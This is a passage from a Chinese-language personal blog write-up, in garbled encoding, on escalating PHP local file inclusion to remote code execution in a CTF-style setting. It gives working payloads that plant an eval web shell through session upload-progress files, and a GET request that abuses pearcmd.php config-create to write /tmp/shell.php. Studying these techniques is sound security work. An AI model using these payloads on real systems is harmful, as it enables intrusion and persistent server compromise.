      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: rf<span class="string">&#x27;&#x27;</span><span class="string">&#x27;&lt;?php file_put_contents(&#x27;</span>/tmp/success2<span class="string">&#x27;, &#x27;</span><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;duo&quot;</span>]);<span class="meta">?&gt;</span><span class="string">&#x27;); echo(&#x27;</span>&#123;flag&#125;<span class="string">&#x27;); ?&gt;&#x27;</span><span class="string">&#x27;&#x27;</span>&#125;</span><br></pre></td></tr></table></div></figure>

<p>æˆ‘ä»¬æ¥è§£ææ¯”è¾ƒé‡è¦çš„è¿™å¥è¯ï¼ŒPHP_SESSION_UPLOAD_PROGRESSæ˜¯ä¹‹å‰æˆ‘ä»¬å®šä¸‹çš„å‚æ•°åï¼Œï¼ˆè¿™é‡Œæ˜¯é‡‡ç”¨äº†é»˜è®¤çš„å‚æ•°åï¼Œå¦‚æœæ”¹äº†çš„è¯ï¼Œè¿™ä¸ªæ–¹æ³•ä¹Ÿä¼šå¤±æ•ˆï¼‰</p>
<p>æ³¨æ„ï¼Œè¿™é‡Œç”Ÿæˆçš„/tmp/success2æ˜¯ä¸€ä¸ªæ²¡åç¼€çš„æ–‡ä»¶ï¼Œä½†ä¹Ÿæ˜¯æ–‡ä»¶ï¼Œè¢«åŒ…å«æ—¶ä¸€æ ·è¢«è§£æä¸ºphpæ‰§è¡Œã€‚</p>
<p>rfâ€™â€™â€™  â€˜â€™â€™åº”è¯¥æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œ</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php file_put_contents(&#x27;/tmp/success2&#x27;, &#x27;&lt;?php @eval($_POST[&quot;duo&quot;]);?&gt;&#x27;); echo(&#x27;&#123;flag&#125;&#x27;); ?&gt;</span><br></pre></td></tr></table></div></figure>

<p> æ˜¯æˆ‘ä»¬å†™å…¥çš„å†…å®¹ï¼Œæˆ‘ä»¬æŠŠå®ƒå†™åœ¨äº†ä¸Šä¼ æ–‡ä»¶æ—¶ï¼Œä¸´æ—¶äº§ç”Ÿçš„sessionæ–‡ä»¶ï¼š/tmp/sess_PHPSESSIDä¸­ï¼Œå®ƒçš„ä»£ç å†…å®¹æ˜¯</p>
<p>1.åˆ›å»ºä¸€ä¸ªshellæ–‡ä»¶â€”â€”/tmp/success2ï¼Œç„¶ååœ¨shellæ–‡ä»¶ä¸­å†™å…¥â€™<?php @eval($_POST["duo"]);?>â€˜</p>
<p>2.è¾“å‡º echo(â€˜{flag}â€™); è¿™å¥è¯çš„ä½œç”¨æ˜¯ç”¨äºåˆ¤æ–­æˆ‘ä»¬æ˜¯å¦å†™å…¥æˆåŠŸäº†çš„ã€‚</p>

        <h2 id="éªŒè¯"   >
          <a href="#éªŒè¯" class="heading-link"><i class="fas fa-link"></i></a><a href="#éªŒè¯" class="headerlink" title="éªŒè¯"></a>éªŒè¯</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(</span><br><span class="line">         f&#x27;&#123;target&#125;?file=/tmp/sess_&#123;flag&#125;&#x27;,</span><br><span class="line">      )</span><br><span class="line">      if flag.encode() in response.content</span><br></pre></td></tr></table></div></figure>

<p>åˆ¤æ–­æ–¹æ³•æ˜¯è¿™æ ·çš„ï¼Œç”±äºä¸Šä¼ æ–‡ä»¶æ—¶ä¸´æ—¶åˆ›å»ºäº†/tmp/sess_PHPSESSIDæ–‡ä»¶ï¼Œç°åœ¨æˆ‘ä»¬è¦åˆ©ç”¨includeæ¥æ‰§è¡Œå®ƒï¼Œé‚£æˆ‘ä»¬æ€ä¹ˆåˆ¤æ–­æˆ‘ä»¬æ‰§è¡ŒæˆåŠŸäº†å‘¢ï¼Œå°±ç”¨æˆ‘ä»¬å†™å…¥çš„echo(â€˜{flag}â€™);æ¥åˆ¤æ–­ï¼Œå¦‚æœæˆ‘ä»¬å¾—åˆ°çš„ç½‘é¡µå›æ˜¾ä¸­ï¼Œè¾“å‡ºäº†æˆ‘ä»¬çš„flagï¼Œè¯´æ˜è¿™ä¸ª/tmp/sess_PHPSESSIDæ–‡ä»¶å·²ç»è¢«è§£ææ‰§è¡Œäº†ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªå›æ˜¾çš„ç¤ºä¾‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111160108217.png" alt="image-20211115015943526"></p>
<p>è¿™æ ·æˆ‘ä»¬çš„æœ¨é©¬å°±å†™å…¥æˆåŠŸäº†ï¼Œç”¨èšå‰‘è¿æ¥ï¼Œæ‹¿åˆ°flag:</p>
<p><img src="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111160108218.png" alt="image-20211115020027362"></p>

        <h1 id="åŸç†2"   >
          <a href="#åŸç†2" class="heading-link"><i class="fas fa-link"></i></a><a href="#åŸç†2" class="headerlink" title="åŸç†2"></a>åŸç†2</h1>
      
        <h3 id="pear-peclã€"   >
          <a href="#pear-peclã€" class="heading-link"><i class="fas fa-link"></i></a><a href="#pear-peclã€" class="headerlink" title="pear/peclã€"></a>pear/peclã€</h3>
      
        <h4 id="ä»€ä¹ˆä¸œè¥¿"   >
          <a href="#ä»€ä¹ˆä¸œè¥¿" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä»€ä¹ˆä¸œè¥¿" class="headerlink" title="ä»€ä¹ˆä¸œè¥¿"></a>ä»€ä¹ˆä¸œè¥¿</h4>
      <p><img src="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111160108219.png" alt="image-20211115215142909"></p>
<p>peclæ˜¯PHPä¸­ç”¨äºç®¡ç†æ‰©å±•è€Œä½¿ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œè€Œpearæ˜¯peclä¾èµ–çš„ç±»åº“ã€‚</p>
<p>pecl/pearä¸­æœ‰ä¸€ä¸ªæ–‡ä»¶ pearcmd.phpã€‚</p>

        <h4 id="åˆ©ç”¨æ¡ä»¶"   >
          <a href="#åˆ©ç”¨æ¡ä»¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h4>
      <p>åœ¨7.3åŠä»¥å‰ï¼Œpecl/pearæ˜¯é»˜è®¤å®‰è£…çš„ï¼›åœ¨7.4åŠä»¥åï¼Œéœ€è¦æˆ‘ä»¬åœ¨ç¼–è¯‘PHPçš„æ—¶å€™æŒ‡å®š<code>--with-pear</code>æ‰ä¼šå®‰è£…ã€‚</p>
<p>ä¸è¿‡ï¼Œåœ¨Dockerä»»æ„ç‰ˆæœ¬é•œåƒä¸­ï¼Œpcel/pearéƒ½ä¼šè¢«é»˜è®¤å®‰è£…ï¼Œå®‰è£…çš„è·¯å¾„åœ¨<code>/usr/local/lib/php</code>ã€‚</p>
<p>åŸæœ¬å®ƒåªæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œä¸åœ¨webç›®å½•ä¸‹é¢ï¼Œä½†æ˜¯æˆ‘ä»¬ç°åœ¨èƒ½æ–‡ä»¶åŒ…å«ï¼Œæˆ‘ä»¬å¯åŒ…å«åˆ°pearä¸­ï¼Œåˆ©ç”¨å®ƒçš„å‘½ä»¤æ¥åšäº‹ã€‚</p>

        <h4 id="åˆ©ç”¨æ–¹æ³•"   >
          <a href="#åˆ©ç”¨æ–¹æ³•" class="heading-link"><i class="fas fa-link"></i></a><a href="#åˆ©ç”¨æ–¹æ³•" class="headerlink" title="åˆ©ç”¨æ–¹æ³•"></a>åˆ©ç”¨æ–¹æ³•</h4>
      
        <h5 id="1-config-create"   >
          <a href="#1-config-create" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-config-create" class="headerlink" title="1.config-create"></a><strong>1.config-create</strong></h5>
      <p><img src="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111160108220.png" alt="image-20211115215513426"></p>
<p>åˆ©ç”¨å®ƒçš„ä¸€ä¸ªå‘½ä»¤ï¼Œconfig-createæ¥åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œå®ƒæœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ–‡ä»¶å†…å®¹ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å†™å…¥çš„è·¯å¾„ã€‚</p>

        <h5 id="2-SERVER-â€˜argvâ€™"   >
          <a href="#2-SERVER-â€˜argvâ€™" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-SERVER-â€˜argvâ€™" class="headerlink" title="2.$_SERVER[â€˜argvâ€™]"></a><strong>2.$_SERVER[â€˜argvâ€™]</strong></h5>
      <p>â€‹    å‘ç°Dockerç¯å¢ƒä¸‹çš„PHPä¼šå¼€å¯<code>register_argc_argv</code>è¿™ä¸ªé…ç½®ã€‚å½“å¼€å¯äº†è¿™ä¸ªé€‰é¡¹ï¼Œç”¨æˆ·çš„è¾“å…¥å°†ä¼šè¢«èµ‹äºˆç»™<code>$argc</code>ã€<code>$argv</code>ã€<code>$_SERVER[&#39;argv&#39;]</code>å‡ ä¸ªå˜é‡ã€‚ä»–ä»¬éƒ½æ˜¯å…¨å±€å˜é‡ï¼Œä¸ºä¼ é€’ç»™è„šæœ¬çš„å‚æ•°æ•°ç»„â€”â€”</p>
<p>$argc â€” ä¼ é€’ç»™è„šæœ¬çš„å‚æ•°æ•°ç›®</p>
<p>$argv â€” ä¼ é€’ç»™è„šæœ¬çš„å‚æ•°æ•°ç»„</p>
<p>è€Œ$_SERVER[â€˜argvâ€™]è¿™ä¸ªå‚æ•°æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„ï¼Œargvæ˜¯å‘½ä»¤è¡Œå‚æ•°ï¼ŒRFC3875ä¸­è§„å®šï¼Œå¦‚æœquery-stringä¸­ä¸åŒ…å«<code>=</code>ï¼Œä¸”è¯·æ±‚æ˜¯GETæˆ–HEADï¼Œåˆ™query-stringéœ€è¦è¢«ä½œä¸ºå‘½ä»¤è¡Œå‚æ•°ã€‚<strong>ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæˆ‘ä»¬ä¼ é€’çš„å‚æ•°æ²¡æœ‰é”®ï¼ˆå‚æ•°åï¼‰ï¼Œé‚£è¿™ä¸ªå‚æ•°å°±ä¼šå˜æˆå‘½ä»¤è¡Œå‚æ•°argvã€‚</strong></p>
<p>ï¼ˆquery-stringæ˜¯æŒ‡æˆ‘ä»¬åœ¨urlä¸­ä¼ çš„å‚æ•°ï¼‰<img src="https://storage.tttang.com/media/attachment/2021/11/01/661223a3-6bfb-4ef2-ad14-0a6bc53128fa.png" alt="image-20211101072557483.png"></p>
<p>è€Œpearåˆä¼šå»å‘½ä»¤è¡Œä¸­è·å–argvï¼š</p>
<p><img src="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111160108221.png" alt="image-20211116005524798"></p>
<p>æ‰€ä»¥ï¼Œè¿™å°±å¾ˆå·§äº†ï¼Œæˆ‘ä»¬ä¼ å…¥å‘½ä»¤è¡Œå‚æ•°argvï¼Œå†åŒ…å«pearcmd.phpæ¥è¿è¡Œå®ƒï¼Œä¹Ÿå°±æ˜¯è¿è¡Œæˆ‘ä»¬ä¼ å…¥çš„å‘½ä»¤ï¼Œç»“åˆå®ƒçš„ config-create å‘½ä»¤åˆ›å»ºshellæ–‡ä»¶ã€‚</p>

        <h5 id="3-payload"   >
          <a href="#3-payload" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-payload" class="headerlink" title="3.payload"></a>3.payload</h5>
      <p>æœ€åï¼Œå¾—åˆ°çš„payloadå¦‚ä¸‹ï¼šï¼ˆpç¥çš„ï¼‰</p>
<p>/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/<?=phpinfo()?>+/tmp/shell.php    </p>
<p>è¿™é‡Œçš„+å·æ˜¯ç©ºæ ¼çš„æ„æ€ï¼Œæ˜¯ç©ºæ ¼è¢«ç¼–ç å˜æˆäº†+å·ï¼Œæ‰€ä»¥æœ€åçš„å‘½ä»¤è¡Œå‚æ•°å°±æ˜¯ï¼š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config-create //&lt;?=phpinfo()?&gt; /tmp/shell.php</span><br></pre></td></tr></table></div></figure>

<figure class="highlight http"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/shell.php</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></table></div></figure>

<p>æˆ‘è‡ªå·±åˆå°è¯•äº†ä¸€ä¸‹ï¼Œæˆ‘å‘ç°å»æ‰<?=phpinfo()?>å‰é¢çš„/ä¹Ÿå¯ä»¥è¿è¡Œï¼š</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">file=/usr/local/lib/php/pearcmd.php&amp;+config-create+/&amp;<span class="meta">&lt;?=</span>phpinfo()<span class="meta">?&gt;</span>+/tmp/bis2.php</span><br><span class="line">ä¸‰ä¸ªå‚æ•°:</span><br><span class="line">	file=/usr/local/lib/php/pearcmd.php</span><br><span class="line">    +config-create+/</span><br><span class="line">    <span class="meta">&lt;?=</span>phpinfo()<span class="meta">?&gt;</span>+/tmp/bis2.php</span><br></pre></td></tr></table></div></figure>

<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config-create /&lt;?=phpinfo()?&gt; /tmp/shell.php</span><br></pre></td></tr></table></div></figure>

<p>ä½†æ˜¯config-create / é‡Œçš„/ä¸èƒ½å»æ‰ï¼Œå®ƒåº”è¯¥ä»£è¡¨çš„æ˜¯æ ¹ç›®å½•çš„æ„æ€ï¼Œåº”è¯¥æ˜¯ä¸€ä¸ªå›ºå®šçš„å‚æ•°ï¼š</p>
<p><img src="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111160108222.png" alt="image-20211116010232266"></p>
<p>æœ€åï¼Œshellè¢«å†™åˆ°äº†/tmp/shell.phpä¸‹ï¼ŒæˆåŠŸè·å–</p>

        <h1 id="æ”¶è·ï¼š"   >
          <a href="#æ”¶è·ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ”¶è·ï¼š" class="headerlink" title="æ”¶è·ï¼š"></a>æ”¶è·ï¼š</h1>
      <p>ä¸€ç¯‡å¤§ç¥å†™çš„å¥½åšå®¢å¼ºäºæˆ‘åœ¨ç™¾åº¦æœä¸€æ•´æ™š</p>
</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ FIN ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Autor: </span><span class="copyright-author__value"><a href="http://example.com">Biscuit19_</a></span></div><div class="copyright-link"><span class="copyright-link__name">Enlace: </span><span class="copyright-link__value"><a href="http://example.com/2021/11/16/LFI-to-RCE/">http://example.com/2021/11/16/LFI-to-RCE/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">Todos los artÃ­culos de este blog estÃ¡n bajo licencia  de <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> a menos que se indique lo contrario</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://example.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">æ–‡ä»¶åŒ…å«</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2021/11/28/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">å‘½ä»¤æ‰§è¡Œ-æ–‡ä»¶åŒ…å«</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2021/11/07/badmac/"><span class="paginator-prev__text">badmac</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Contenido</span><span class="sidebar-nav-ov">ReseÃ±a</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%A8%E6%AF%94"><span class="toc-number">1.</span> <span class="toc-text">
          ç¬¨æ¯”</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E7%90%861"><span class="toc-number">2.</span> <span class="toc-text">
          åŸç†1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.1.</span> <span class="toc-text">
          1.ä¸´æ—¶æ–‡ä»¶åŒ…å«</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-session-upload-progress%E4%B8%8ESession%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.2.</span> <span class="toc-text">
          2.session.upload_progressä¸Sessionæ–‡ä»¶åŒ…å«</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-session-upload-progress"><span class="toc-number">2.2.1.</span> <span class="toc-text">
          1.session.upload_progress</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86%E4%B8%8E%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.2.2.</span> <span class="toc-text">
          2.åˆ©ç”¨åŸç†ä¸æ¡ä»¶</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B01"><span class="toc-number">3.</span> <span class="toc-text">
          å®ç°1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#cookies-%E2%80%98PHPSESSID%E2%80%99-flag"><span class="toc-number">3.1.</span> <span class="toc-text">
          cookies&#x3D;{â€˜PHPSESSIDâ€™: flag},</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#data"><span class="toc-number">3.2.</span> <span class="toc-text">
          data</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81"><span class="toc-number">3.3.</span> <span class="toc-text">
          éªŒè¯</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E7%90%862"><span class="toc-number">4.</span> <span class="toc-text">
          åŸç†2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pear-pecl%E3%80%81"><span class="toc-number">4.0.1.</span> <span class="toc-text">
          pear&#x2F;peclã€</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E4%B8%9C%E8%A5%BF"><span class="toc-number">4.0.1.1.</span> <span class="toc-text">
          ä»€ä¹ˆä¸œè¥¿</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">4.0.1.2.</span> <span class="toc-text">
          åˆ©ç”¨æ¡ä»¶</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">4.0.1.3.</span> <span class="toc-text">
          åˆ©ç”¨æ–¹æ³•</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-config-create"><span class="toc-number">4.0.1.3.1.</span> <span class="toc-text">
          1.config-create</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-SERVER-%E2%80%98argv%E2%80%99"><span class="toc-number">4.0.1.3.2.</span> <span class="toc-text">
          2.$_SERVER[â€˜argvâ€™]</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-payload"><span class="toc-number">4.0.1.3.3.</span> <span class="toc-text">
          3.payload</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%B6%E8%8E%B7%EF%BC%9A"><span class="toc-number">5.</span> <span class="toc-text">
          æ”¶è·ï¼š</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/6.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">â†‘åœ¨ç°åœºï¼Œæˆ‘æ˜¯å…”å­ğŸ°</p></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/Biscuit19" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="Biscuit19_" target="_blank" rel="noopener" data-popover="Wechat" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-weixin"></i></span></a><a class="sidebar-ov-social-item" href="https://user.qzone.qq.com/911268514/main" target="_blank" rel="noopener" data-popover="QQ" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-qq"></i></span></a></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">4</div><div class="sidebar-ov-state-item__name">Archivo</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">CategorÃ­as</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">2</div><div class="sidebar-ov-state-item__name">Etiquetas</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">Has leÃ­do </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright Â© 2022</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Biscuit19_</span></div><div><span>Potenciado por <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Tema - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script></body></html>